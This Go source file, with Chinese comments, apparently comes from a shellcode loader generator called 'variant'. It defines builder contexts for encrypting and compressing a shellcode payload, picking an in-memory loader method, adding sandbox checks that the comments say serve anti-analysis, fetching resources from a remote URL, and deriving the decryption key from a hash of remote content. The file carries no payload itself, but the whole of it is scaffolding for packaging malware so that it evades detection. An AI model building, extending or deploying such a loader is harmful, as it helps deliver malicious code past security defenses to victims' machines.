package templates

import (
	"fmt"
	"strings"
	"variant/log"
	"variant/payloads"
	"variant/xrand"
)

// TmplCtx 是模板渲染的核心上下文，包含多种加载方式的配置
type TmplCtx struct {
	Local   *LocalCtx   // 本地加载配置
	Dynamic *DynamicCtx // 动态加载配置
	Args    *ArgsCtx    // 参数加载配置
	Pokemon *PokemonCtx // Pokemon 加载配置
}

// TmplBuilder 用于构建完整的 TmplCtx 实例
type TmplBuilder struct {
	tmpl *TmplCtx
}

// NewTmplBuilder 创建一个新的 TmplCtx 构建器
func NewTmplBuilder() *TmplBuilder {
	return &TmplBuilder{
		tmpl: &TmplCtx{},
	}
}

// Render 返回最终构建好的 TmplCtx 实例
func (b *TmplBuilder) Render() *TmplCtx {
	return b.tmpl
}

// BaseCtx 是所有具体加载策略上下文（如 LocalCtx, DynamicCtx）共享的基础组件集合。
// 它封装了模板执行过程中所需的通用功能模块。
type BaseCtx struct {
	Payload  *payloads.PayloadCtx // 载荷处理模块，负责管理核心业务逻辑（shellcode）
	Loader   *LoaderCtx           // 加载器模块，定义了如何在内存中执行载荷
	Crypto   *CryptoCtx           // 加密模块，负责载荷的加密和解密
	Sandbox  *SandboxCtx          // 沙箱环境检测模块，用于反分析
	Compress *CompressCtx         // 压缩模块，用于减小载荷体积
	Remote   *RemoteCtx           // 远程加载模块，支持从网络位置获取资源
	Hash     *HashCtx             // 动态哈希模块，用于从远程资源动态派生密钥
}

// BaseCtxBuilder 用于构建 BaseCtx 实例
type BaseCtxBuilder struct {
	base *BaseCtx
}

// NewBaseCtxBuilder 创建一个新的 BaseCtx 构建器
func NewBaseCtxBuilder() *BaseCtxBuilder {
	return &BaseCtxBuilder{
		base: &BaseCtx{},
	}
}

// SetPayload 设置 PayloadCtx 配置
//   - fn: 配置函数，用于设置 PayloadCtx 的具体参数
//   - note: 需要手动配置加密/压缩 Payload
func (b *BaseCtxBuilder) SetPayload(fn func(*payloads.PayloadCtx)) *BaseCtxBuilder {
	if b.base.Payload == nil {
		b.base.Payload = &payloads.PayloadCtx{}
	}
	fn(b.base.Payload)
	return b
}

// SetAutoPayload 设置 PayloadCtx 并根据配置自动加密和压缩。
func (b *BaseCtxBuilder) SetAutoPayload(fn func(*payloads.PayloadCtx)) *BaseCtxBuilder {
	if b.base.Payload == nil {
		b.base.Payload = &payloads.PayloadCtx{}
	}
	fn(b.base.Payload)

	// 检查加密模块是否已配置
	if b.base.Crypto == nil || b.base.Crypto.Encrypt == nil {
		log.Warn("crypto not configured, encryption skipped")
		return b
	}

	// 判断是否启用远程动态密钥
	var key, iv []byte
	if b.base.Remote != nil && b.base.Hash != nil {
		// 使用哈希派生密钥
		dKey, dIV := DeriveKeyAndIVFromHash(
			b.base.Hash.Url,
			b.base.Hash.Function,
			b.base.Hash.KeyRange,
			b.base.Hash.IVRange,
		)
		key, iv = []byte(dKey), []byte(dIV)
	} else {
		// 使用静态配置的密钥
		key, iv = b.base.Crypto.Key, b.base.Crypto.IV
	}

	// 如果密钥或 IV 为空，跳过加密
	if len(key) == 0 || len(iv) == 0 {
		log.Warn("key or iv is empty, encryption skipped")
		return b
	}

	// 执行加密逻辑
	if !b.verifyEncrypt(b.base.Crypto.Encrypt, key, iv) {
		return b
	}

	// 如果启用了压缩，执行压缩操作
	if b.base.Compress != nil {
		b.base.Payload.Encryption = AutoCompressPayload(
			b.base.Payload.Encryption,
			b.base.Compress.Algorithm,
			b.base.Compress.Ratio,
		)
	}

	return b
}

func (b *BaseCtxBuilder) verifyEncrypt(encrypt any, key, iv []byte) bool {
	p, err := b.base.Payload.Encrypt(encrypt, key, iv)
	if err != nil {
		log.Errorf("encryption failed: %v", err)
		b.base.Payload.Encryption = ""
		return false
	}

	switch v := p.(type) {
	case string:
		if v == "" {
			log.Errorf("empty encryption result")
			b.base.Payload.Encryption = ""
			return false
		}
		b.base.Payload.Encryption = v
	case []string:
		b.base.Payload.Encryption = strings.Join(v, "")
	case []byte:
		if len(v) == 0 {
			log.Errorf("empty encryption result")
			b.base.Payload.Encryption = ""
			return false
		}
		b.base.Payload.Encryption = string(v)
	default:
		log.Errorf("unsupported return type: %T", p)
		b.base.Payload.Encryption = ""
		return false
	}

	return true
}

// SetLoader 设置 Loader 配置
//   - fn: 配置函数，用于设置 LoaderCtx 的具体参数
func (b *BaseCtxBuilder) SetLoader(fn func(*LoaderCtx)) *BaseCtxBuilder {
	if b.base.Loader == nil {
		b.base.Loader = &LoaderCtx{}
	}
	fn(b.base.Loader)
	return b
}

// SetCrypto 设置 Crypto 配置
//   - fn: 配置函数，用于设置 CryptoCtx 的具体参数
func (b *BaseCtxBuilder) SetCrypto(fn func(*CryptoCtx)) *BaseCtxBuilder {
	if b.base.Crypto == nil {
		b.base.Crypto = &CryptoCtx{}
	}
	fn(b.base.Crypto)
	return b
}

// SetSandbox 设置 Sandbox 配置
//   - fn: 配置函数，用于设置 SandboxCtx 的具体参数
func (b *BaseCtxBuilder) SetSandbox(fn func(*SandboxCtx)) *BaseCtxBuilder {
	if b.base.Sandbox == nil {
		b.base.Sandbox = &SandboxCtx{}
	}
	fn(b.base.Sandbox)
	return b
}

// SetCompress 设置 Compress 配置
//   - fn: 配置函数，用于设置 CompressCtx 的具体参数
func (b *BaseCtxBuilder) SetCompress(fn func(*CompressCtx)) *BaseCtxBuilder {
	if b.base.Compress == nil {
		b.base.Compress = &CompressCtx{}
	}
	fn(b.base.Compress)
	return b
}

// Build 验证并返回最终构建的 BaseCtx 实例
// 它会检查所有必需的模块是否已配置，如果缺少则返回错误
//
// 返回:
//   - *BaseCtx: 构建完成的上下文实例
//   - error: 如果关键模块（Crypto, Payload, Loader）未配置，则返回错误
func (b *BaseCtxBuilder) Build() (*BaseCtx, error) {
	if b.base.Crypto == nil {
		return nil, fmt.Errorf("crypto module is not configured")
	}
	if b.base.Payload == nil {
		return nil, fmt.Errorf("payload module is not configured")
	}
	if b.base.Loader == nil {
		return nil, fmt.Errorf("loader module is not configured")
	}

	return b.base, nil
}

// CryptoCtx 加密配置
type CryptoCtx struct {
	Import  string `default:"variant/crypto"` // 导入路径
	Encrypt any    // 加密函数
	Decrypt string // 解密函数
	Key     []byte // 加解密密钥
	IV      []byte // 初始化向量
}

// NewCryptoCtx 返回默认 Crypto 配置
//   - encrypt: 加密函数
//   - decrypt: 解密函数
//   - key: 加解密密钥
//   - iv: 初始化向量
//   - return: func(*CryptoCtx) 函数配置
func NewCryptoCtx(encrypt any, decrypt string, key []byte, iv []byte) func(*CryptoCtx) {
	if encrypt == nil || decrypt == "" {
		log.Fatal("encrypt function and decrypt function name cannot be empty")
	}

	if len(key) == 0 {
		log.Fatal("crypto key is empty or nil")
	}

	return func(crypto *CryptoCtx) {
		crypto.Import = "variant/crypto"
		crypto.Encrypt = encrypt
		crypto.Decrypt = decrypt
		crypto.Key = key
		crypto.IV = iv
	}
}

// LoaderCtx 本地加载配置
type LoaderCtx struct {
	Import string // 导入路径
	Method string // 使用的加载方法
}

// NewLoaderCtx 返回默认的 Loader 配置
//   - Import：默认值，"variant/loader"
//   - m (Method)：使用的 Loader 函数/方法
//   - return: func(*LoaderCtx) 函数配置
func NewLoaderCtx(method string) func(*LoaderCtx) {
	if method == "" {
		log.Warn("use default loader: loader.Direct")
		method = "loader.Direct"
	}

	return func(loader *LoaderCtx) {
		loader.Import = "variant/loader"
		loader.Method = method
	}
}

// SandboxCtx 沙箱配置
type SandboxCtx struct {
	Import  string   // 导入路径
	Methods []string // 使用的沙箱方法
}

// NewSandboxCtx 创建沙箱配置函数
//   - method: 使用的沙箱方法列表
//   - return: func(*SandboxCtx) 函数配置
func NewSandboxCtx(method []string) func(*SandboxCtx) {
	if method == nil {
		return nil
	}

	return func(sandbox *SandboxCtx) {
		sandbox.Import = "variant/sandbox"
		sandbox.Methods = method
	}
}

// CompressCtx 压缩配置
type CompressCtx struct {
	Import    string // 导入路径
	Algorithm string // 压缩算法
	Ratio     int    // 压缩比率
}

// NewCompressCtx 创建压缩配置函数
//   - algorithm: 压缩算法名称
//   - ratio: 压缩比率
//   - return: func(*CompressCtx) 函数配置
//   - note: 函数会根据 algorithm 参数自动匹配解压方法
func NewCompressCtx(algorithm string, ratio int) func(*CompressCtx) {
	algo := strings.ToLower(algorithm)

	switch {
	case strings.Contains(algo, "lzw"):
		return func(c *CompressCtx) {
			c.Import = "variant/compress"
			c.Algorithm = "compress.LzwDecompress"
			c.Ratio = ratio
		}
	case strings.Contains(algo, "zstd"):
		return func(c *CompressCtx) {
			c.Import = "variant/compress"
			c.Algorithm = "compress.ZSTDDecompress"
		}
	default:
		log.Fatalf("unsupported compress algorithm: %s", algorithm)
	}
	return nil
}

// RemoteCtx 定义远程资源加载配置
type RemoteCtx struct {
	Import   string // 导入
	Function string // 远程加载函数名，如"RestyGet"
	Url      string // 远程资源URL地址
}

// SetRemote 设置 Remote 配置
//   - fn: 配置函数，用于设置 RemoteCtx 的具体参数
func (b *BaseCtxBuilder) SetRemote(fn func(*RemoteCtx)) *BaseCtxBuilder {
	if b.base.Remote == nil {
		b.base.Remote = &RemoteCtx{}
	}
	fn(b.base.Remote)
	return b
}

// NewRemoteCtx 创建压缩配置函数
//   - remoteFunc: 远程加载函数名，如"RestyGet"
//   - remoteUrl： 远程资源URL地址
//   - return: func(*RemoteCtx) 函数配置
func NewRemoteCtx(remoteFunc string, remoteUrl string) func(*RemoteCtx) {
	return func(r *RemoteCtx) {
		r.Import = "variant/remote"
		r.Function = remoteFunc
		r.Url = remoteUrl
	}
}

// HashCtx 定义哈希计算配置
type HashCtx struct {
	HashVar  string // 哈希值变量名，如"fileHash"
	Function string // 哈希计算函数名，如"SHA256Hash"
	Url      string // 计算哈希的目标URL
	KeyRange string // 密钥切片区间，如"[0:16]"
	IVRange  string // 向量切片区间，如"[16:32]"
}

// SetHash 设置 Hash 配置
//   - fn: 配置函数，用于设置 RemoteCtx 的具体参数
func (b *BaseCtxBuilder) SetHash(fn func(*HashCtx)) *BaseCtxBuilder {
	if b.base.Hash == nil {
		b.base.Hash = &HashCtx{}
	}
	fn(b.base.Hash)
	return b
}

// NewHashCtx 创建压缩配置函数
//   - hashFunc: 远程加载函数名，如"RestyGet"
//   - hashUrl： 远程资源URL地址
//   - keyRange：密钥切片区间，如"[0:16]"
//   - ivRange： 向量切片区间，如"[16:32]"
//   - return: func(*HashCtx) 函数配置
func NewHashCtx(hashFunc string, hashUrl string, keyRange string, ivRange string) func(*HashCtx) {

	return func(h *HashCtx) {
		h.HashVar = xrand.N(3)
		h.Function = hashFunc
		h.Url = hashUrl
		h.KeyRange = keyRange
		h.IVRange = ivRange
	}
}
